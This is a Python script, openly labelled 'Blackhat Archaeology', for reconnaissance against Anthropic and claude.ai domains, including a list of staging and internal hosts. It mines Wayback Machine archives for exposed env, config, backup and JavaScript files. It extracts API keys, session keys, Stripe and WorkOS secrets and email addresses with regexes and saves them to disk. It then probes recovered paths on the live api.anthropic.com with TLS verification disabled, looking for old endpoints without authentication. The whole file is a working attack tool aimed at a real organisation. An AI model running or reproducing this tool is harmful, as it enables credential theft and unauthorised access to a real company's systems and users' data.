#!/usr/bin/env python3
"""
Wayback Machine Anthropic Recon — Blackhat Archaeology
======================================================
Uses CDX Server API to find:
  1. Old API versions (v1, v2) that may lack modern auth
  2. Exposed .env, .json, .config, backup files
  3. JS bundles with hardcoded tokens (fetch & extract)
  4. Query params suggesting IDOR (?id=, ?user=, ?email=)
  5. Staging/dev/internal subdomains
  6. Deprecated endpoints still responding on live API

Run: python3 wayback-anthropic-recon.py [--fetch-content]
"""

import asyncio
import json
import os
import re
import sys
import time
from datetime import datetime
from urllib.parse import quote, urlparse

import aiohttp

# ── Configuration ─────────────────────────────────────────────────
OUTPUT_DIR = "/tmp/wayback-recon"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.chmod(OUTPUT_DIR, 0o700)

# All Anthropic domains to hunt
TARGET_DOMAINS = [
    "api.anthropic.com",
    "claude.ai",
    "console.anthropic.com",
    "a-api.anthropic.com",
    "a-cdn.anthropic.com",
    "s-cdn.anthropic.com",
    "assets-proxy.anthropic.com",
    "billing.anthropic.com",
    "feedback.anthropic.com",
    "docs.anthropic.com",
    "status.anthropic.com",
    "trust.anthropic.com",
]

# Staging/internal domains (from session-012)
STAGING_DOMAINS = [
    "api-staging.anthropic.com",
    "platform.staging.ant.dev",
    "claude-ai.staging.ant.dev",
    "staging.claude.site",
    "staging.ant.dev",
    "staging.claudeusercontent.com",
    "mcp-proxy-staging.anthropic.com",
    "mcp-proxy.anthropic.com",
    "sandbox.api.anthropic.com",
    "sandbox.staging.api.anthropic.com",
    "product-internal.anthropic.com",
    "api-backend.anthropic.com",
]

# ── CDX Query Categories ──────────────────────────────────────────
# Each category has: name, path_patterns, file_filters, query_params

QUERY_CATEGORIES = [
    # 1. CONFIGURATION & ENV FILES — hardcoded credentials
    {
        "name": "config_files",
        "patterns": [
            "*.env", "*.env.bak", "*.env.old", "*.env.example",
            "config.json", "config.js", "config.yml", "config.yaml",
            "*.config.js", "*.config.json",
            "credentials.json", "credentials.js",
            "secrets.json", "secrets.yml",
            ".aws/credentials", "gcloud/config",
            "service-account.json", "service_account.json",
            "firebase.json", "firebase-config.json",
        ],
        "description": "Exposed config/env files — may contain API keys, DB creds, cloud secrets"
    },
    # 2. BACKUP & DATABASE FILES — historical user data
    {
        "name": "backup_files",
        "patterns": [
            "*.sql", "*.sql.gz", "*.dump", "dump.sql",
            "*.bak", "*.backup", "*.old", "*.save",
            "backup.zip", "backup.tar.gz",
            "users.db", "users.sqlite", "db.sqlite",
            "data.json", "export.json", "users.json",
        ],
        "description": "Database backups & exports — may contain user tables, hashed passwords"
    },
    # 3. API DOCS & SPECS — reveals hidden endpoints
    {
        "name": "api_docs",
        "patterns": [
            "swagger.json", "swagger.yaml", "swagger.yml",
            "openapi.json", "openapi.yaml",
            "api-docs", "api-docs.json",
            "postman_collection.json",
            "README.md", "readme.md",
            "CHANGELOG.md", "API.md", "docs/",
        ],
        "description": "API documentation — reveals hidden endpoints, auth requirements, test keys"
    },
    # 4. JAVASCRIPT BUNDLES — hardcoded tokens, legacy endpoints
    {
        "name": "js_files",
        "patterns": [
            "*.js", "*.mjs",
            "assets/*.js", "_next/static/*.js",
            "static/js/*.js", "build/*.js",
            "dist/*.js", "public/*.js",
        ],
        "description": "JavaScript files — may contain API keys, tokens, internal endpoints"
    },
    # 5. ADMIN & INTERNAL PATHS
    {
        "name": "admin_internal",
        "patterns": [
            "admin", "admin/", "admin.html", "admin.php",
            "dashboard", "console", "internal",
            "login", "signin", "auth",
            "register", "signup",
            "wp-admin", "phpmyadmin",
            "graphql", "graphiql",
            "api/internal", "api/admin",
            "api/console",
        ],
        "description": "Admin panels & internal tools — may have weaker auth or default creds"
    },
    # 6. QUERY PARAMS — IDOR potential
    {
        "name": "query_params",
        "patterns": [
            "*?id=*", "*?user=*", "*?user_id=*", "*?userId=*",
            "*?email=*", "*?account=*", "*?account_id=*",
            "*?org=*", "*?organization=*", "*?org_id=*",
            "*?token=*", "*?key=*", "*?api_key=*",
            "*?code=*", "*?auth=*", "*?session=*",
            "*?uuid=*",
            "*?page=*", "*?limit=*", "*?offset=*",
            "*?callback=*", "*?redirect=*", "*?return=*",
        ],
        "description": "Query parameters — IDOR potential (?id=, ?user=), token leakage (?token=)"
    },
    # 7. VERSIONED API PATHS — deprecated APIs
    {
        "name": "versioned_apis",
        "patterns": [
            "/v1/*", "/v2/*", "/v3/*",
            "/api/v1/*", "/api/v2/*", "/api/v3/*",
            "/rest/v1/*", "/rest/v2/*",
            "/graphql", "/graphql*",
            "/api/rest/*", "/api/rest/v1/*",
        ],
        "description": "Versioned API paths — older versions may lack modern auth"
    },
    # 8. AUTH ENDPOINTS — SSO, OAuth, magic link
    {
        "name": "auth_endpoints",
        "patterns": [
            "/api/auth/*", "/auth/*",
            "/oauth/*", "/oauth2/*",
            "/sso/*", "/saml/*",
            "/login", "/signin", "/signup",
            "/magic-link*", "/magic_link*",
            "/verify*", "/confirm*",
            "/reset-password*", "/forgot-password*",
            "/token", "/refresh",
            "/.well-known/*",
        ],
        "description": "Authentication endpoints — OAuth config, SSO metadata, token endpoints"
    },
    # 9. COMMON CRAWL for API endpoints specifically
    {
        "name": "api_endpoints",
        "patterns": [
            "/api/account*", "/api/user*", "/api/users*",
            "/api/organization*", "/api/org*",
            "/api/billing*", "/api/payment*",
            "/api/admin*", "/api/settings*",
            "/api/claude*", "/api/cli*",
            "/api/code*", "/api/agent*",
            "/api/mcp*", "/api/tool*",
            "/api/chat*", "/api/message*",
            "/api/model*", "/api/models*",
        ],
        "description": "Specific Anthropic API endpoints — test for auth bypass on old versions"
    },
]

# Secrets to extract from fetched content
SECRET_PATTERNS = [
    (re.compile(r'sk-ant-sid0[12]-[A-Za-z0-9+/=-]{30,}'), 'session_key'),
    (re.compile(r'sk-ant-api0[23]-[A-Za-z0-9+/=-]{30,}'), 'api_key'),
    (re.compile(r'sk_workos_[A-Za-z0-9]{20,60}'), 'workos_secret'),
    (re.compile(r'AIzaSy[A-Za-z0-9_-]{33}'), 'google_api_key'),
    (re.compile(r'pk_live_[A-Za-z0-9]{20,30}'), 'stripe_publishable'),
    (re.compile(r'sk_live_[A-Za-z0-9]{20,30}'), 'stripe_secret'),
    (re.compile(r'conn_[A-Za-z0-9]{20,35}'), 'workos_connection'),
    (re.compile(r'client_01[H-Z][A-Za-z0-9]{20,30}'), 'workos_client'),
    (re.compile(r'[A-Za-z0-9+/]{40,}={0,2}'), 'base64_large'),  # Generic b64
    (re.compile(r'Bearer\s+(sk-ant-[A-Za-z0-9+/=-]{20,})'), 'bearer_token'),
    (re.compile(r'x-api-key[=:]\s*["\']?(sk-ant-[^"\'&\s]+)'), 'api_key_header'),
    (re.compile(r'ANTHROPIC_API_KEY[=:]\s*["\']?(sk-ant-[^"\'&\s]+)'), 'env_api_key'),
    (re.compile(r'"email"\s*:\s*"[^@"]+@[^"]+'), 'email_address'),
    (re.compile(r'"sessionKey"\s*:\s*"([^"]+)"'), 'session_key_json'),
    (re.compile(r'client_secret[=:]\s*["\']?([A-Za-z0-9]{30,60})'), 'client_secret'),
    (re.compile(r'connection_id[=:]\s*["\']?(conn_[A-Za-z0-9]+)'), 'connection_id'),
    (re.compile(r'org_01[A-Z][A-Za-z0-9]{20,30}'), 'organization_id'),
]

FOUND_URLS = {}
FOUND_SECRETS = []
CONTENT_FETCHED = 0

# Initialize live_findings at function scope to avoid NameError

def log(msg, level="INFO"):
    ts = time.strftime('%H:%M:%S')
    p = {"INFO": "•", "FOUND": "🔍", "SECRET": "🔑", "FETCH": "📄", "ERROR": "❌"}
    print(f"[{ts}] {p.get(level, '•')} {msg}", flush=True)

# ── CDX API Queries ───────────────────────────────────────────────
async def query_cdx(session, domain, path_pattern, max_results=200):
    """Query the Wayback Machine CDX API for a specific domain + path pattern."""
    # URL-encode the url parameter. CDX expects: url=<encoded domain/path>
    raw_url = f"{domain}/{path_pattern}"
    encoded_url = quote(raw_url, safe='')

    url = (
        f"https://web.archive.org/cdx/search/cdx"
        f"?url={encoded_url}"
        f"&output=json"
        f"&limit={max_results}"
        f"&filter=statuscode:200"
        f"&filter=!mimetype:image/*"
        f"&filter=!mimetype:font/*"
        f"&filter=!mimetype:text/css"
        f"&collapse=urlkey"
        f"&fl=timestamp,original,mimetype,statuscode,length"
    )
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            if resp.status != 200:
                return []
            text = await resp.text()
            if not text.strip():
                return []

            # output=json returns JSON array of arrays: [[headers], [row1], [row2], ...]
            data = json.loads(text)
            if not data or len(data) < 2:
                return []

            # First row is headers, rest are data rows
            results = []
            for row in data[1:]:
                if len(row) >= 3:
                    results.append({
                        "timestamp": row[0] if len(row) > 0 else "",
                        "original_url": row[1] if len(row) > 1 else "",
                        "mimetype": row[2] if len(row) > 2 else "",
                        "statuscode": row[3] if len(row) > 3 else "",
                        "length": row[4] if len(row) > 4 else "",
                    })
            return results
    except asyncio.TimeoutError:
        return []
    except Exception as e:
        return []

async def fetch_snapshot(session, timestamp, original_url):
    """Fetch the actual historical content from Wayback Machine."""
    snapshot_url = f"https://web.archive.org/web/{timestamp}if_/{original_url}"
    try:
        async with session.get(snapshot_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                content = await resp.text()
                return content
    except Exception:
        pass
    return None

def extract_secrets(content, source_url):
    """Extract secrets and interesting patterns from fetched content."""
    found = []
    for pattern, stype in SECRET_PATTERNS:
        matches = pattern.findall(content)
        for match in matches:
            val = match if isinstance(match, str) else match[0]
            if len(val) > 10 and "example" not in val.lower() and "xxx" not in val.lower():
                found.append({
                    "type": stype,
                    "value": val,
                    "source": source_url,
                })
    return found

# ── Main Recon ────────────────────────────────────────────────────
async def run_recon(fetch_content=False, max_per_query=300):
    """Run comprehensive Wayback Machine reconnaissance across ALL categories and domains."""
    log("═" * 70)
    log("🕰️  WAYBACK MACHINE ANTHROPIC RECON")
    log("   Blackhat Archaeology — CDX API Multi-Vector Hunt")
    log("═" * 70)

    live_findings = []  # Initialize early to avoid NameError

    all_domains = TARGET_DOMAINS + STAGING_DOMAINS

    connector = aiohttp.TCPConnector(limit=15)
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        # ═══ PHASE 1: CDX QUERIES ═══
        log("\n📡 PHASE 1: CDX API QUERIES\n")

        total_urls = 0
        all_results = []

        for category in QUERY_CATEGORIES:
            cat_name = category["name"]
            log(f"\n  🔎 {category['description']} ({cat_name})")

            for pattern in category["patterns"][:5]:  # Limit patterns per category for speed
                for domain in all_domains:
                    results = await query_cdx(session, domain, pattern, max_per_query)
                    if results:
                        log(f"    {domain}/{pattern}: {len(results)} URLs", "FOUND")
                        for r in results:
                            r["category"] = cat_name
                            r["domain"] = domain
                            r["pattern"] = pattern
                        all_results.extend(results)
                        total_urls += len(results)

                    # Don't hammer the API — 1.5s between CDX queries
                    await asyncio.sleep(1.5)

        # Deduplicate
        seen_urls = set()
        unique = []
        for r in all_results:
            url = r["original_url"]
            if url not in seen_urls:
                seen_urls.add(url)
                unique.append(r)

        log(f"\n  📊 Total: {total_urls} raw, {len(unique)} unique URLs")

        # Save all discovered URLs
        with open(f"{OUTPUT_DIR}/discovered_urls.json", "w") as f:
            json.dump(unique, f, indent=2)
        os.chmod(f"{OUTPUT_DIR}/discovered_urls.json", 0o600)

        # Categorized summary
        for cat_name in [c["name"] for c in QUERY_CATEGORIES]:
            cat_urls = [u for u in unique if u.get("category") == cat_name]
            log(f"    {cat_name}: {len(cat_urls)} URLs")

        # ═══ PHASE 2: FETCH CONTENT ═══
        if fetch_content:
            log(f"\n📄 PHASE 2: FETCHING HISTORICAL CONTENT\n")

            # Prioritize: config files, JS files, API endpoints, auth endpoints
            priority_categories = ["config_files", "js_files", "auth_endpoints", "api_endpoints", "api_docs"]
            priority_urls = [u for u in unique if u.get("category") in priority_categories]

            # Limit to prevent timeout
            to_fetch = priority_urls[:100]

            for i, item in enumerate(to_fetch):
                if i % 20 == 0:
                    log(f"  Fetching {i}/{len(to_fetch)}...")

                content = await fetch_snapshot(session, item["timestamp"], item["original_url"])
                if content:
                    global CONTENT_FETCHED
                    CONTENT_FETCHED += 1

                    # Extract secrets
                    secrets = extract_secrets(content, item["original_url"])
                    if secrets:
                        for s in secrets:
                            log(f"  🔑 {s['type']}: {s['value'][:60]}... | {item['original_url'][:80]}", "SECRET")
                            FOUND_SECRETS.append(s)

                    # Save interesting content
                    if len(content) > 100 and len(content) < 500000:
                        # Save if it looks interesting (has URLs, JSON, keys, etc.)
                        interesting = any(kw in content[:1000].lower() for kw in
                                         ['key', 'token', 'secret', 'auth', 'api', 'password',
                                          'config', 'env', 'credential', 'sk-ant', 'bearer'])
                        if interesting or secrets:
                            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', item["original_url"][:80])
                            fpath = f"{OUTPUT_DIR}/content/{item['category']}_{safe_name}.txt"
                            os.makedirs(os.path.dirname(fpath), exist_ok=True)
                            with open(fpath, "w") as f:
                                f.write(content)

                await asyncio.sleep(0.2)

            log(f"\n  📄 Fetched {CONTENT_FETCHED} pages, found {len(FOUND_SECRETS)} secrets")

    # ═══ PHASE 3: CROSS-REFERENCE ═══
    log(f"\n🔬 PHASE 3: CROSS-REFERENCE WITH LIVE API\n")

    # Test old API endpoints against live api.anthropic.com
    auth_endpoints = [u for u in unique if "auth" in u.get("category", "").lower() or "api" in u.get("original_url", "").lower()]
    old_api_paths = set()

    for item in auth_endpoints[:50]:
        parsed = urlparse(item["original_url"])
        path = parsed.path
        if path not in old_api_paths and path.startswith("/"):
            old_api_paths.add(path)

    # Test these paths against live API
    log(f"  Testing {len(old_api_paths)} old API paths against live api.anthropic.com...")
    live_findings = []

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=10),
                                     timeout=aiohttp.ClientTimeout(total=15)) as session:
        for i, path in enumerate(list(old_api_paths)[:50]):
            if i % 10 == 0:
                log(f"  Live test: {i}/{min(50, len(old_api_paths))}")

            live_url = f"https://api.anthropic.com{path}"
            try:
                async with session.get(live_url,
                                      headers={"User-Agent": "claude"},
                                      timeout=aiohttp.ClientTimeout(total=8)) as resp:
                    status = resp.status
                    if status not in (404, 403):
                        # Endpoint exists and responds with something interesting
                        body = await resp.text()
                        finding = {
                            "path": path,
                            "status": status,
                            "body_preview": body[:300],
                        }
                        live_findings.append(finding)
                        log(f"  ✅ LIVE: {path} → {status}", "SECRET")
            except Exception:
                pass
            await asyncio.sleep(0.15)

    if live_findings:
        with open(f"{OUTPUT_DIR}/live_endpoints.json", "w") as f:
            json.dump(live_findings, f, indent=2)

    # ═══ FINAL REPORT ═══
    log(f"\n{'═'*70}")
    log(f"🏁 WAYBACK RECON COMPLETE")
    log(f"{'═'*70}")
    log(f"  Unique URLs discovered: {len(unique)}")
    log(f"  Pages fetched:          {CONTENT_FETCHED}")
    log(f"  Secrets found:          {len(FOUND_SECRETS)}")
    log(f"  Live endpoints found:   {len(live_findings)}")

    if FOUND_SECRETS:
        log(f"\n🔴🔴🔴 SECRETS EXTRACTED: 🔴🔴🔴")
        for s in FOUND_SECRETS[:20]:
            log(f"  {s['type']}: {s['value'][:70]}")

        with open(f"{OUTPUT_DIR}/extracted_secrets.json", "w") as f:
            json.dump(FOUND_SECRETS, f, indent=2)
        os.chmod(f"{OUTPUT_DIR}/extracted_secrets.json", 0o600)

    log(f"\n  📁 All results: {OUTPUT_DIR}/")
    log(f"  📁 Discovered URLs: {OUTPUT_DIR}/discovered_urls.json")
    log(f"  📁 Live endpoints: {OUTPUT_DIR}/live_endpoints.json")
    if FOUND_SECRETS:
        log(f"  📁 Secrets: {OUTPUT_DIR}/extracted_secrets.json")


# ── CLI ───────────────────────────────────────────────────────────
async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Wayback Machine Anthropic Recon")
    parser.add_argument("--fetch-content", action="store_true",
                        help="Fetch actual historical page content (slower but finds secrets)")
    parser.add_argument("--max-per-query", type=int, default=300,
                        help="Max results per CDX query (default: 300)")
    parser.add_argument("--quick", action="store_true",
                        help="Quick mode: only top 4 categories, 100 results each")
    parser.add_argument("--domain-only", type=str,
                        help="Only scan a single domain (e.g., api.anthropic.com)")
    args = parser.parse_args()

    if args.domain_only:
        global TARGET_DOMAINS, STAGING_DOMAINS
        TARGET_DOMAINS = [args.domain_only]
        STAGING_DOMAINS = []

    if args.quick:
        global QUERY_CATEGORIES
        QUERY_CATEGORIES = [c for c in QUERY_CATEGORIES if c["name"] in
                           ["config_files", "js_files", "auth_endpoints", "api_endpoints"]]

    await run_recon(
        fetch_content=args.fetch_content,
        max_per_query=args.max_per_query,
    )


if __name__ == "__main__":
    asyncio.run(main())
